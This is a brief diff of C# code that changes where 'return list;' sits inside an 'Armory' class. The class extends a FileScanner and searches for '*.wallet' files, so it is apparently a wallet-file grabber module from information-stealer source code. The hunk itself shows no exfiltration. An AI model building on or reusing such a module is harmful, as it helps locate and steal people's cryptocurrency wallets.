@@ -30,10 +30,11 @@ public class Armory : FileScanner
 				Pattern = "*.wallet",
 				Recoursive = false
 			});
+			return list;
 		}
 		catch
 		{
+			return list;
 		}
-		return list;
 	}
 }
